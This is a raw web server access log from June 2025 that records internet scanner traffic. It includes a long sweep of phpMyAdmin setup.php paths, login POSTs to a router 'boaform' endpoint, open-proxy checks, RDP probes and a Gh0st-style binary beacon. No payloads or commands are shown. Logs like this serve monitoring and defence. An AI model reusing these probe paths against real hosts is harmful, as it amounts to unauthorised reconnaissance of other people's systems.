106.228.7.199 - - [19/Jun/2025:07:17:04 +0000] "GET / HTTP/1.1" 200 825 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36"
185.242.226.12 - - [19/Jun/2025:07:18:04 +0000] "\x16\x03\x01\x00\x8B\x01\x00\x00\x87\x03\x03])\xB6<XM[\xB5\xB2\x90\xB9\xA7\x96r\xED\xA5\xAC\x1F \xADf\xF1v5\x1E\xAF`\x8D|7\xF8r\x00\x00\x1A\xC0/\xC0+\xC0\x11\xC0\x07\xC0\x13\xC0\x09\xC0\x14\xC0" 400 157 "-" "-"
183.147.184.57 - - [19/Jun/2025:07:22:07 +0000] "GET /index.php HTTP/1.1" 200 825 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"
20.55.36.63 - - [19/Jun/2025:07:23:55 +0000] "GET /hudson HTTP/1.1" 200 825 "-" "Mozilla/5.0 zgrab/0.x"
199.204.97.58 - - [19/Jun/2025:07:26:10 +0000] "GET http://httpbin.org/get HTTP/1.1" 200 825 "-" "Go-http-client/1.1"
183.147.184.57 - - [19/Jun/2025:07:31:09 +0000] "GET /index.php HTTP/1.1" 200 825 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"
183.147.184.57 - - [19/Jun/2025:07:31:11 +0000] "GET /index.php HTTP/1.1" 200 825 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"
183.147.184.57 - - [19/Jun/2025:07:32:17 +0000] "GET /index.php HTTP/1.1" 502 559 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"
183.147.184.57 - - [19/Jun/2025:07:32:23 +0000] "GET / HTTP/1.1" 502 559 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"
183.147.184.57 - - [19/Jun/2025:07:32:37 +0000] "GET / HTTP/1.1" 502 559 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"
183.147.184.57 - - [19/Jun/2025:07:32:41 +0000] "GET / HTTP/1.1" 200 13 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"
185.218.84.178 - - [19/Jun/2025:07:33:43 +0000] "GET / HTTP/1.1" 200 13 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
183.147.184.57 - - [19/Jun/2025:07:34:04 +0000] "GET / HTTP/1.1" 200 13 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"
183.147.184.57 - - [19/Jun/2025:07:34:46 +0000] "GET / HTTP/1.1" 502 559 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"
183.36.35.201 - - [19/Jun/2025:07:37:43 +0000] "GET / HTTP/1.1" 502 559 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.134 Safari/537.36"
183.36.35.201 - - [19/Jun/2025:07:37:43 +0000] "GET /favicon.ico HTTP/1.1" 200 1150 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:52.0) Gecko/20100101 Firefox/52.0"
204.76.203.219 - - [19/Jun/2025:07:37:59 +0000] "GET / HTTP/1.1" 502 157 "-" "curl/7.81.0"
199.204.97.58 - - [19/Jun/2025:07:39:40 +0000] "GET http://httpbin.org/get HTTP/1.1" 502 157 "-" "Go-http-client/1.1"
183.147.184.57 - - [19/Jun/2025:07:41:45 +0000] "GET / HTTP/1.1" 500 6854 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"
183.147.184.57 - - [19/Jun/2025:07:42:03 +0000] "GET / HTTP/1.1" 500 6832 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"
183.147.184.57 - - [19/Jun/2025:07:42:12 +0000] "GET / HTTP/1.1" 502 559 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"
183.147.184.57 - - [19/Jun/2025:07:42:17 +0000] "GET / HTTP/1.1" 500 6853 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"
183.147.184.57 - - [19/Jun/2025:07:42:23 +0000] "GET / HTTP/1.1" 502 559 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"
204.76.203.212 - - [19/Jun/2025:07:43:29 +0000] "GET / HTTP/1.1" 502 559 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
66.240.205.34 - - [19/Jun/2025:07:48:59 +0000] "Gh0st\xAD\x00\x00\x00\xE0\x00\x00\x00x\x9CKS``\x98\xC3\xC0\xC0\xC0\x06\xC4\x8C@\xBCQ\x96\x81\x81\x09H\x07\xA7\x16\x95e&\xA7*\x04$&g+\x182\x94\xF6\xB000\xAC\xA8rc\x00\x01\x11\xA0\x82\x1F\x5C`&\x83\xC7K7\x86\x19\xE5n\x0C9\x95n\x0C;\x84\x0F3\xAC\xE8sch\xA8^\xCF4'J\x97\xA9\x82\xE30\xC3\x91h]&\x90\xF8\xCE\x97S\xCBA4L?2=\xE1\xC4\x92\x86\x0B@\xF5`\x0CT\x1F\xAE\xAF]" 400 157 "-" "-"
183.147.184.57 - - [19/Jun/2025:07:49:55 +0000] "GET / HTTP/1.1" 502 559 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"
183.147.184.57 - - [19/Jun/2025:07:50:15 +0000] "GET / HTTP/1.1" 502 559 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"
199.204.97.58 - - [19/Jun/2025:07:53:11 +0000] "GET http://httpbin.org/get HTTP/1.1" 502 157 "-" "Go-http-client/1.1"
141.255.162.250 - - [19/Jun/2025:07:58:52 +0000] "GET / HTTP/1.1" 502 157 "-" "Hello World"
204.76.203.219 - - [19/Jun/2025:08:02:56 +0000] "GET / HTTP/1.1" 502 559 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
167.94.145.109 - - [19/Jun/2025:08:03:39 +0000] "GET / HTTP/1.1" 502 157 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
167.94.145.109 - - [19/Jun/2025:08:03:41 +0000] "PRI * HTTP/2.0" 400 157 "-" "-"
167.94.145.109 - - [19/Jun/2025:08:03:44 +0000] "GET /favicon.ico HTTP/1.1" 200 1150 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
167.94.145.109 - - [19/Jun/2025:08:03:46 +0000] "\x16\x03\x01\x00\xF7\x01\x00\x00\xF3\x03\x03\xA0s\x1C\x89\x17\xCF\xCD3" 400 157 "-" "-"
167.94.145.109 - - [19/Jun/2025:08:03:52 +0000] "GET /sitemap.xml HTTP/1.1" 502 157 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
167.94.145.109 - - [19/Jun/2025:08:03:54 +0000] "\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03\xA2\xB8/wv\x8C\x0Fp!397\x09\x80\xE9\xE2\x18\xE1\xC6-\xB5v\xBA\xD8\x8Ci;\x04\xEDg\x1A\x8B \xB1e\xAC_\x09\x1A\x86\x0B=\xBC\x08D\xE2O=\x9F\xA2\xF8\xC2\xD6(\x1F\x1EP\xA3\xF2\xDE\x99u\x8B\x9DN\x00&\xCC\xA8\xCC\xA9\xC0/\xC00\xC0+\xC0,\xC0\x13\xC0\x09\xC0\x14\xC0" 400 157 "-" "-"
183.147.184.57 - - [19/Jun/2025:08:05:35 +0000] "GET / HTTP/1.1" 500 6870 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"
183.147.184.57 - - [19/Jun/2025:08:05:53 +0000] "GET / HTTP/1.1" 502 559 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"
183.147.184.57 - - [19/Jun/2025:08:06:22 +0000] "GET / HTTP/1.1" 502 559 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"
183.147.184.57 - - [19/Jun/2025:08:06:30 +0000] "GET / HTTP/1.1" 500 6870 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"
199.204.97.58 - - [19/Jun/2025:08:06:40 +0000] "GET http://httpbin.org/get HTTP/1.1" 500 6870 "-" "Go-http-client/1.1"
204.76.203.219 - - [19/Jun/2025:08:08:04 +0000] "GET / HTTP/1.1" 500 6870 "-" "curl/7.81.0"
183.147.184.57 - - [19/Jun/2025:08:10:23 +0000] "GET / HTTP/1.1" 500 6864 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"
199.204.97.58 - - [19/Jun/2025:08:20:10 +0000] "GET http://httpbin.org/get HTTP/1.1" 500 6870 "-" "Go-http-client/1.1"
176.65.148.234 - - [19/Jun/2025:08:21:12 +0000] "GET / HTTP/1.1" 500 6870 "-" "-"
45.140.17.52 - - [19/Jun/2025:08:21:38 +0000] "\x03\x00\x00/*\xE0\x00\x00\x00\x00\x00Cookie: mstshash=Administr" 400 157 "-" "-"
93.174.93.12 - - [19/Jun/2025:08:24:31 +0000] "\x16\x03\x02\x01o\x01\x00\x01k\x03\x02RH\xC5\x1A#\xF7:N\xDF\xE2\xB4\x82/\xFF\x09T\x9F\xA7\xC4y\xB0h\xC6\x13\x8C\xA4\x1C=\x22\xE1\x1A\x98 \x84\xB4,\x85\xAFn\xE3Y\xBBbhl\xFF(=':\xA9\x82\xD9o\xC8\xA2\xD7\x93\x98\xB4\xEF\x80\xE5\xB9\x90\x00(\xC0" 400 157 "-" "-"
199.204.97.58 - - [19/Jun/2025:08:33:40 +0000] "GET http://httpbin.org/get HTTP/1.1" 500 6870 "-" "Go-http-client/1.1"
204.76.203.219 - - [19/Jun/2025:08:40:50 +0000] "GET / HTTP/1.1" 500 6864 "-" "curl/7.81.0"
199.204.97.58 - - [19/Jun/2025:08:47:11 +0000] "GET http://httpbin.org/get HTTP/1.1" 500 6864 "-" "Go-http-client/1.1"
45.142.193.4 - - [19/Jun/2025:09:00:24 +0000] "\x03\x00\x00/*\xE0\x00\x00\x00\x00\x00Cookie: mstshash=Administr" 400 157 "-" "-"
199.204.97.58 - - [19/Jun/2025:09:00:41 +0000] "GET http://httpbin.org/get HTTP/1.1" 500 6864 "-" "Go-http-client/1.1"
66.240.205.34 - - [19/Jun/2025:09:08:26 +0000] "H\x00\x00\x00tj\xA8\x9E#D\x98+\xCA\xF0\xA7\xBBl\xC5\x19\xD7\x8D\xB6\x18\xEDJ\x1En\xC1\xF9xu[l\xF0E\x1D-j\xEC\xD4xL\xC9r\xC9\x15\x10u\xE0%\x86Rtg\x05fv\x86]%\xCC\x80\x0C\xE8\xCF\xAE\x00\xB5\xC0f\xC8\x8DD\xC5\x09\xF4" 400 157 "-" "-"
199.204.97.58 - - [19/Jun/2025:09:14:10 +0000] "GET http://httpbin.org/get HTTP/1.1" 500 6864 "-" "Go-http-client/1.1"
204.76.203.219 - - [19/Jun/2025:09:18:15 +0000] "GET / HTTP/1.1" 500 6870 "-" "curl/7.81.0"
199.204.97.58 - - [19/Jun/2025:09:27:41 +0000] "GET http://httpbin.org/get HTTP/1.1" 500 6864 "-" "Go-http-client/1.1"
34.140.63.218 - - [19/Jun/2025:09:31:32 +0000] "GET / HTTP/1.1" 500 6864 "-" "python-requests/2.32.4"
35.203.210.98 - - [19/Jun/2025:09:35:12 +0000] "GET / HTTP/1.1" 500 6870 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
185.218.84.178 - - [19/Jun/2025:09:40:16 +0000] "GET / HTTP/1.1" 500 6864 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
199.204.97.58 - - [19/Jun/2025:09:41:11 +0000] "GET http://httpbin.org/get HTTP/1.1" 500 6864 "-" "Go-http-client/1.1"
204.76.203.219 - - [19/Jun/2025:09:51:23 +0000] "GET / HTTP/1.1" 500 6864 "-" "curl/7.81.0"
199.204.97.58 - - [19/Jun/2025:09:54:40 +0000] "GET http://httpbin.org/get HTTP/1.1" 500 6864 "-" "Go-http-client/1.1"
204.76.203.212 - - [19/Jun/2025:09:56:53 +0000] "GET / HTTP/1.1" 500 6864 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
43.130.72.177 - - [19/Jun/2025:09:58:38 +0000] "GET / HTTP/1.1" 500 6870 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1"
144.172.112.211 - - [19/Jun/2025:10:05:52 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 500 6864 "http://118.31.36.181:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
144.172.112.211 - - [19/Jun/2025:10:05:52 +0000] "" 400 0 "-" "-"
78.153.140.177 - - [19/Jun/2025:10:07:02 +0000] "\x16\x03\x01\x00\xAC\x01\x00\x00\xA8\x03\x03d\x8BC]\x18\x9F\xEA\xF9S\xC3\xB4^{\xDF\xBBIT8x\xF9\xF0:=\x19v=\xBA_\xECz\x90=\x00\x008\xC0,\xC0" 400 157 "-" "-"
199.204.97.58 - - [19/Jun/2025:10:08:10 +0000] "GET http://httpbin.org/get HTTP/1.1" 500 6864 "-" "Go-http-client/1.1"
199.204.97.58 - - [19/Jun/2025:10:21:41 +0000] "GET http://httpbin.org/get HTTP/1.1" 500 6870 "-" "Go-http-client/1.1"
204.76.203.219 - - [19/Jun/2025:10:23:45 +0000] "GET / HTTP/1.1" 500 6864 "-" "curl/7.81.0"
199.204.97.58 - - [19/Jun/2025:10:35:11 +0000] "GET http://httpbin.org/get HTTP/1.1" 500 6864 "-" "Go-http-client/1.1"
87.255.194.135 - - [19/Jun/2025:10:41:31 +0000] "GET /admin/assets/css/jquery-ui.css HTTP/1.0" 500 6851 "-" "xfa1"
199.204.97.58 - - [19/Jun/2025:10:48:40 +0000] "GET http://httpbin.org/get HTTP/1.1" 500 6870 "-" "Go-http-client/1.1"
20.65.217.81 - - [19/Jun/2025:10:55:12 +0000] "MGLNDD_118.31.36.181_80" 400 157 "-" "-"
43.157.142.101 - - [19/Jun/2025:11:00:05 +0000] "GET / HTTP/1.1" 500 6864 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1"
199.204.97.58 - - [19/Jun/2025:11:02:11 +0000] "GET http://httpbin.org/get HTTP/1.1" 500 6870 "-" "Go-http-client/1.1"
199.204.97.58 - - [19/Jun/2025:11:15:41 +0000] "GET http://httpbin.org/get HTTP/1.1" 500 6864 "-" "Go-http-client/1.1"
109.199.96.191 - - [19/Jun/2025:11:16:14 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 500 6864 "http://118.31.36.181:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
109.199.96.191 - - [19/Jun/2025:11:16:15 +0000] "" 400 0 "-" "-"
183.224.219.194 - - [19/Jun/2025:11:16:21 +0000] "HEAD /phpMyAdmin-2.5.7-pl1/scripts/setup.php HTTP/1.1" 404 0 "-" "Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.98 Mobile Safari/537.36"
183.224.219.194 - - [19/Jun/2025:11:16:23 +0000] "HEAD /websql/scripts/setup.php HTTP/1.1" 404 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.120 Safari/537.36 Edg/109.0.1518.61"
183.224.219.194 - - [19/Jun/2025:11:16:23 +0000] "HEAD /MyAdmin/scripts/setup.php HTTP/1.1" 404 0 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Version/15.1 Safari/537.36"
183.224.219.194 - - [19/Jun/2025:11:16:23 +0000] "HEAD /phpMyAdmin-2.5.5/scripts/setup.php HTTP/1.1" 404 0 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.87 Safari/537.36"
183.224.219.194 - - [19/Jun/2025:11:16:23 +0000] "HEAD /phpMyAdmin-2.11.9.2/scripts/setup.php HTTP/1.1" 404 0 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.87 Safari/537.36"
183.224.219.194 - - [19/Jun/2025:11:16:24 +0000] "HEAD /phpMyAdmin-2.11.7/scripts/setup.php HTTP/1.1" 404 0 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1"
183.224.219.194 - - [19/Jun/2025:11:16:24 +0000] "HEAD /mysqladmin/scripts/setup.php HTTP/1.1" 404 0 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:108.0) Gecko/20100101 Firefox/108.0"
183.224.219.194 - - [19/Jun/2025:11:16:24 +0000] "HEAD /admin/scripts/setup.php HTTP/1.1" 404 0 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
183.224.219.194 - - [19/Jun/2025:11:16:24 +0000] "HEAD /phpMyAdmin-2.11.1.2/scripts/setup.php HTTP/1.1" 404 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36 OPR/85.0.4341.72"
183.224.219.194 - - [19/Jun/2025:11:16:29 +0000] "HEAD /webdb/scripts/setup.php HTTP/1.1" 404 0 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:108.0) Gecko/20100101 Firefox/108.0"
183.224.219.194 - - [19/Jun/2025:11:16:30 +0000] "HEAD /phpMyAdmin-2.5.5-pl1/scripts/setup.php HTTP/1.1" 404 0 "-" "Mozilla/5.0 (iPad; CPU OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.5 Mobile/15E148 Safari/604.1"
183.224.219.194 - - [19/Jun/2025:11:16:30 +0000] "HEAD /db/scripts/setup.php HTTP/1.1" 404 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.137 Safari/537.36"
183.224.219.194 - - [19/Jun/2025:11:16:30 +0000] "HEAD /PHPMYADMIN/scripts/setup.php HTTP/1.1" 404 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.137 Safari/537.36"
183.224.219.194 - - [19/Jun/2025:11:16:30 +0000] "HEAD /admin/pma/scripts/setup.php HTTP/1.1" 404 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.137 Safari/537.36"
183.224.219.194 - - [19/Jun/2025:11:16:31 +0000] "HEAD /webadmin/scripts/setup.php HTTP/1.1" 404 0 "-" "Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.98 Mobile Safari/537.36"
183.224.219.194 - - [19/Jun/2025:11:16:31 +0000] "HEAD /sqlmanager/scripts/setup.php HTTP/1.1" 404 0 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1"
183.224.219.194 - - [19/Jun/2025:11:16:31 +0000] "HEAD /phpMyAdmin/scripts/setup.php HTTP/1.1" 404 0 "-" "Mozilla/5.0 (iPad; CPU OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.5 Mobile/15E148 Safari/604.1"
183.224.219.194 - - [19/Jun/2025:11:16:31 +0000] "HEAD /phpma/scripts/setup.php HTTP/1.1" 404 0 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Version/15.1 Safari/537.36"
183.224.219.194 - - [19/Jun/2025:11:16:31 +0000] "HEAD /myadmin/scripts/setup.php HTTP/1.1" 404 0 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4714.95 Safari/537.36 OPR/83.0.4254.70"
183.224.219.194 - - [19/Jun/2025:11:16:32 +0000] "HEAD /web/phpMyAdmin/scripts/setup.php HTTP/1.1" 404 0 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Safari/537.36"
183.224.219.194 - - [19/Jun/2025:11:16:33 +0000] "HEAD /phpMyAdmin-2.11.0/scripts/setup.php HTTP/1.1" 404 0 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4714.95 Safari/537.36 OPR/83.0.4254.70"
183.224.219.194 - - [19/Jun/2025:11:16:33 +0000] "HEAD /phpMyAdmin3/scripts/setup.php HTTP/1.1" 404 0 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
183.224.219.194 - - [19/Jun/2025:11:16:34 +0000] "HEAD /phpMyAdmin-2.10.2/scripts/setup.php HTTP/1.1" 404 0 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 11_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"
183.224.219.194 - - [19/Jun/2025:11:16:34 +0000] "HEAD /dbadmin/scripts/setup.php HTTP/1.1" 404 0 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:108.0) Gecko/20100101 Firefox/108.0"
183.224.219.194 - - [19/Jun/2025:11:16:34 +0000] "HEAD /phpmyadmin/scripts/setup.php HTTP/1.1" 404 0 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1"
183.224.219.194 - - [19/Jun/2025:11:16:34 +0000] "HEAD /phpMyAdmin-2.8.0.2/scripts/setup.php HTTP/1.1" 404 0 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4714.95 Safari/537.36 OPR/83.0.4254.70"
183.224.219.194 - - [19/Jun/2025:11:16:42 +0000] "HEAD /SQL/scripts/setup.php HTTP/1.1" 404 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.137 Safari/537.36"
183.224.219.194 - - [19/Jun/2025:11:16:42 +0000] "HEAD /mysql/scripts/setup.php HTTP/1.1" 404 0 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
183.224.219.194 - - [19/Jun/2025:11:16:42 +0000] "HEAD /mysqlmanager/scripts/setup.php HTTP/1.1" 404 0 "-" "Mozilla/5.0 (iPad; CPU OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.5 Mobile/15E148 Safari/604.1"
183.224.219.194 - - [19/Jun/2025:11:16:43 +0000] "HEAD /_phpMyAdmin/scripts/setup.php HTTP/1.1" 404 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:110.0) Gecko/20100101 Firefox/110.0"
183.224.219.194 - - [19/Jun/2025:11:16:43 +0000] "HEAD /phpMyAdmin-2.10.0.2/scripts/setup.php HTTP/1.1" 404 0 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:104.0) Gecko/20100101 Firefox/104.0"
183.224.219.194 - - [19/Jun/2025:11:16:43 +0000] "HEAD /php/scripts/setup.php HTTP/1.1" 404 0 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:108.0) Gecko/20100101 Firefox/108.0"
183.224.219.194 - - [19/Jun/2025:11:16:44 +0000] "HEAD /php-myadmin/scripts/setup.php HTTP/1.1" 404 0 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
183.224.219.194 - - [19/Jun/2025:11:16:45 +0000] "HEAD /phpmanager/scripts/setup.php HTTP/1.1" 404 0 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:108.0) Gecko/20100101 Firefox/108.0"
183.224.219.194 - - [19/Jun/2025:11:16:45 +0000] "HEAD /phpmy-admin/scripts/setup.php HTTP/1.1" 404 0 "-" "Mozilla/5.0 (iPad; CPU OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.5 Mobile/15E148 Safari/604.1"
183.224.219.194 - - [19/Jun/2025:11:16:45 +0000] "HEAD /phpMyAdmin-2.11.4/scripts/setup.php HTTP/1.1" 404 0 "-" "Mozilla/5.0 (Linux; Android 12; SM-G781B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Mobile Safari/537.36"
183.224.219.194 - - [19/Jun/2025:11:16:45 +0000] "HEAD /phpMyAdmin-2.5.4/scripts/setup.php HTTP/1.1" 404 0 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:104.0) Gecko/20100101 Firefox/104.0"
183.224.219.194 - - [19/Jun/2025:11:16:46 +0000] "HEAD /phpMyAdmin-2.10.3/scripts/setup.php HTTP/1.1" 404 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.138 Safari/537.36 Edg/112.0.1722.64"
183.224.219.194 - - [19/Jun/2025:11:16:46 +0000] "HEAD /phpMyAdmin2/scripts/setup.php HTTP/1.1" 404 0 "-" "Mozilla/5.0 (Linux; Android 12; SM-G781B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Mobile Safari/537.36"
183.224.219.194 - - [19/Jun/2025:11:16:51 +0000] "HEAD /sqlweb/scripts/setup.php HTTP/1.1" 404 0 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
183.224.219.194 - - [19/Jun/2025:11:16:51 +0000] "HEAD /admin/phpmyadmin/scripts/setup.txt HTTP/1.1" 500 0 "-" "Mozilla/5.0 (iPad; CPU OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.5 Mobile/15E148 Safari/604.1"
183.224.219.194 - - [19/Jun/2025:11:16:51 +0000] "HEAD /phpMyAdmin-2/scripts/setup.php HTTP/1.1" 404 0 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Safari/537.36"
149.50.103.48 - - [19/Jun/2025:11:23:28 +0000] "GET / HTTP/1.1" 500 6864 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
